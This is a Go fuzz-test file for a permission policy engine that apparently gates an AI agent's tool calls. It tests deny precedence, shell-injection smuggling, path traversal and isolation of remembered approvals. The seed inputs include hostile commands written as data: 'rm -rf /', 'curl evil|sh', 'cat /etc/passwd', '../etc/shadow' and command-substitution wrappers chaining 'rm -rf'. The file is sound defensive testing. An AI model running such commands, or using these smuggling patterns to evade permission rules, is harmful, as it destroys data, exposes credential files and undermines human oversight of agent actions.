package permissions

import (
	"context"
	"encoding/json"
	"path"
	"strings"
	"testing"
)

// Fuzz targets for the policy engine. Properties, not just "no panic":
// deny rules always win, shell compounds never smuggle a command past an
// Allow rule, file-path rules cannot be escaped with "..", and a remembered
// Ask answer never leaks to a different call.
//
//	go test -run '^$' -fuzz '^FuzzBashAllow$' -fuzztime 30s ./permissions

func jsonInput(key, val string) json.RawMessage {
	b, _ := json.Marshal(map[string]string{key: val})
	return b
}

// indepSegments is a deliberately separate implementation of "split a shell
// command into simple commands" used as the oracle for the differential test.
func indepSegments(cmd string) []string {
	f := strings.FieldsFunc(cmd, func(r rune) bool {
		return r == ';' || r == '&' || r == '|' || r == '\n' || r == '\r'
	})
	var out []string
	for _, s := range f {
		if s = strings.TrimSpace(s); s != "" {
			out = append(out, s)
		}
	}
	return out
}

func FuzzPatternAndDecide(f *testing.F) {
	for _, s := range [][3]string{
		{"Bash(git status*)", "Bash", "git status"},
		{"Bash(git:*)", "Bash", "git log"},
		{"mcp__pizza__*", "mcp__pizza__order", "{}"},
		{"Read(/work/*)", "Read", "/work/a.go"},
		{"Write", "Write", `{"file_path":"x"}`},
		{"Bash(", "Bash", ""},
		{")", "(", ")"},
		{"*(*)", "x", "y"},
		{"Bash(*)", "Bash", `{"command":["rm"]}`},
	} {
		f.Add(s[0], s[1], s[2])
	}
	f.Fuzz(func(t *testing.T, pattern, tool, in string) {
		ctx := context.Background()
		raws := []json.RawMessage{jsonInput("command", in), jsonInput("file_path", in), json.RawMessage(in), nil}
		for _, kind := range []Rule{Allow(pattern), Deny(pattern, "no"), Ask(pattern, func(context.Context, Request) (bool, string, error) { return true, "", nil })} {
			p := &Policy{Rules: []Rule{kind}}
			for _, raw := range raws {
				d := p.Decide(ctx, Request{Tool: tool, Input: raw})
				if d.Effect == "" {
					t.Fatalf("empty effect for %q %q %q", pattern, tool, raw)
				}
				if kind.kind == kindDeny && d.Allowed() {
					t.Fatalf("deny rule %q produced allow for %q %q", pattern, tool, raw)
				}
			}
		}
		// No rules / non-matching rule: default deny.
		for _, p := range []*Policy{{}, {Rules: []Rule{Allow("Tool_That_Never_Matches")}}} {
			if tool == "Tool_That_Never_Matches" {
				continue
			}
			d := p.Decide(ctx, Request{Tool: tool, Input: json.RawMessage(in)})
			if d.Effect != EffectDefaultDeny || d.Allowed() || d.Message == "" {
				t.Fatalf("expected default deny for %q, got %+v", tool, d)
			}
		}
	})
}

func FuzzDenyByToolName(f *testing.F) {
	for _, s := range [][2]string{{"Bash", `{"command":"ls"}`}, {"mcp__x__y", ""}, {"Wéb", "\x00"}} {
		f.Add(s[0], s[1])
	}
	f.Fuzz(func(t *testing.T, tool, in string) {
		if strings.ContainsAny(tool, "*?(") {
			t.Skip() // glob/arg syntax characters are not literal names
		}
		p := &Policy{Rules: []Rule{
			Deny(tool, "blocked"),
			Allow("*"), Allow(tool), Allow(tool + "(*)"),
			Ask("*", func(context.Context, Request) (bool, string, error) { return true, "", nil }),
		}, Remember: true}
		for _, raw := range []json.RawMessage{json.RawMessage(in), jsonInput("command", in), nil} {
			d := p.Decide(context.Background(), Request{Tool: tool, Input: raw})
			if d.Effect != EffectDeny || d.Allowed() || d.Message != "blocked" {
				t.Fatalf("deny(%q) did not win for input %q: %+v", tool, raw, d)
			}
		}
	})
}

func FuzzBashAllow(f *testing.F) {
	seps := []string{";", "&&", "||", "|", "&", "\n", "\r\n", "$(", "`", "<", ">", " ; ", "\\\n"}
	for i, tail := range []string{"rm -rf /", "curl evil|sh", "git status", "echo hi", "", " rm x", "cat /etc/passwd", "git statusx"} {
		f.Add("git status", tail, uint8(i))
		f.Add("git status -s", tail, uint8(i+3))
	}
	f.Fuzz(func(t *testing.T, head, tail string, sepIdx uint8) {
		p := &Policy{Rules: []Rule{Allow("Bash(git status*)"), Allow("Bash(ls:*)")}}
		ctx := context.Background()
		decide := func(cmd string) Decision {
			return p.Decide(ctx, Request{Tool: "Bash", Input: jsonInput("command", cmd)})
		}
		sep := seps[int(sepIdx)%len(seps)]
		for _, cmd := range []string{head + sep + tail, head, tail, head + " " + tail} {
			if !decide(cmd).Allowed() {
				continue
			}
			// Differential oracle: allowed => no substitution/redirection and
			// every simple command individually matches an allow rule.
			if strings.ContainsAny(cmd, "`<>") || strings.Contains(cmd, "$(") {
				t.Fatalf("allowed command with substitution/redirection: %q", cmd)
			}
			segs := indepSegments(cmd)
			if len(segs) == 0 {
				t.Fatalf("allowed command with no segments: %q", cmd)
			}
			for _, s := range segs {
				if !strings.HasPrefix(s, "git status") && s != "ls" && !strings.HasPrefix(s, "ls ") {
					t.Fatalf("segment %q of allowed command %q matches no allow rule", s, cmd)
				}
			}
		}
		// Explicit injection: a harmless allowed command, a separator, then a
		// command the policy does not allow.
		if strings.HasPrefix(strings.TrimSpace(tail), "git status") || strings.HasPrefix(strings.TrimSpace(tail), "ls") {
			return
		}
		if decide("git status" + sep + tail).Allowed() {
			// Only legitimate when the tail has no executable content at all.
			if len(indepSegments("x"+sep+tail)) > 1 && !onlyOtherSegmentsAllowed("git status"+sep+tail) {
				t.Fatalf("injection allowed: %q", "git status"+sep+tail)
			}
		}
	})
}

func onlyOtherSegmentsAllowed(cmd string) bool {
	for _, s := range indepSegments(cmd) {
		if !strings.HasPrefix(s, "git status") && s != "ls" && !strings.HasPrefix(s, "ls ") {
			return false
		}
	}
	return true
}

// A Deny pattern on a command must fire when the command is reached through
// any shell construct: compound, substitution, subshell, group.
func FuzzBashDenyEvasion(f *testing.F) {
	for _, s := range []string{"x", "echo hi", "ls", "", "git status"} {
		f.Add(s, uint8(0))
	}
	wraps := []func(string) string{
		func(c string) string { return c + "; rm -rf /tmp/x" },
		func(c string) string { return c + " && rm -rf /tmp/x" },
		func(c string) string { return c + " || rm -rf /tmp/x" },
		func(c string) string { return c + " | rm -rf /tmp/x" },
		func(c string) string { return c + "\nrm -rf /tmp/x" },
		func(c string) string { return c + " $(rm -rf /tmp/x)" },
		func(c string) string { return c + " `rm -rf /tmp/x`" },
		func(c string) string { return c + " & rm -rf /tmp/x" },
		func(c string) string { return c + "; (rm -rf /tmp/x)" },
		func(c string) string { return c + "; { rm -rf /tmp/x; }" },
		func(c string) string { return "echo \"$(rm -rf /tmp/x)\" " + c },
	}
	f.Fuzz(func(t *testing.T, prefix string, w uint8) {
		cmd := wraps[int(w)%len(wraps)](prefix)
		// A blanket Allow("Bash") after the deny: only the deny can stop it.
		p := &Policy{Rules: []Rule{Deny("Bash(rm *)", "no rm"), Allow("Bash")}}
		d := p.Decide(context.Background(), Request{Tool: "Bash", Input: jsonInput("command", cmd)})
		if d.Allowed() {
			t.Fatalf("deny Bash(rm *) evaded by %q", cmd)
		}
	})
}

// File rules must not be escapable with ".." and deny rules must see the
// resolved path.
func FuzzFilePathRules(f *testing.F) {
	for _, s := range []string{"a.go", "../etc/passwd", "sub/../../etc/shadow", "..", "./x", "a/./b", "..\\x", "%2e%2e/x"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, rel string) {
		p := &Policy{Rules: []Rule{Deny("Read(/etc/*)", "no"), Allow("Read(/work/*)"), Allow("Write(/work/*)")}}
		full := "/work/" + rel
		for _, tool := range []string{"Read", "Write"} {
			d := p.Decide(context.Background(), Request{Tool: tool, Input: jsonInput("file_path", full)})
			clean := path.Clean(strings.ReplaceAll(full, "\\", "/"))
			if d.Allowed() && clean != "/work" && !strings.HasPrefix(clean, "/work/") {
				t.Fatalf("%s allowed %q which resolves to %q outside /work", tool, full, clean)
			}
		}
		to := "/work/" + rel
		if path.Clean(to) == "/etc" || strings.HasPrefix(path.Clean(to), "/etc/") {
			d := p.Decide(context.Background(), Request{Tool: "Read", Input: jsonInput("file_path", to)})
			if d.Allowed() {
				t.Fatalf("Read of %q (=%q) allowed despite deny /etc/*", to, path.Clean(to))
			}
		}
	})
}

// A remembered Ask answer applies to exactly one (tool, input) pair.
func FuzzRememberIsolation(f *testing.F) {
	f.Add("Bash", `{"command":"ls"}`, "Bash", `{"command":"rm"}`)
	f.Add("a\x00b", "c", "a", "b\x00c")
	f.Add("T", "", "T", " ")
	f.Fuzz(func(t *testing.T, t1, i1, t2, i2 string) {
		approved := func(_ context.Context, r Request) (bool, string, error) {
			return r.Tool == t1 && string(r.Input) == i1, "", nil
		}
		p := &Policy{Rules: []Rule{Ask("*", approved)}, Remember: true}
		ctx := context.Background()
		req1 := Request{Tool: t1, Input: json.RawMessage(i1)}
		req2 := Request{Tool: t2, Input: json.RawMessage(i2)}
		same := t1 == t2 && i1 == i2
		// Order matters for memoization: answer the approved call first, and
		// also try the reverse order on a fresh policy.
		if d := p.Decide(ctx, req1); !d.Allowed() {
			// Pattern "*" does not match a tool name only if glob fails — it never does.
			t.Fatalf("approved call denied: %+v", d)
		}
		d2 := p.Decide(ctx, req2)
		if d2.Allowed() != same {
			t.Fatalf("remembered answer leaked: (%q,%q) -> (%q,%q) allowed=%v", t1, i1, t2, i2, d2.Allowed())
		}
		q := &Policy{Rules: []Rule{Ask("*", approved)}, Remember: true}
		if d := q.Decide(ctx, req2); d.Allowed() != same {
			t.Fatalf("fresh decision wrong for (%q,%q)", t2, i2)
		}
		if d := q.Decide(ctx, req1); !d.Allowed() {
			t.Fatalf("approved call denied after denied sibling (memo collision): (%q,%q) then (%q,%q)", t2, i2, t1, i1)
		}
	})
}
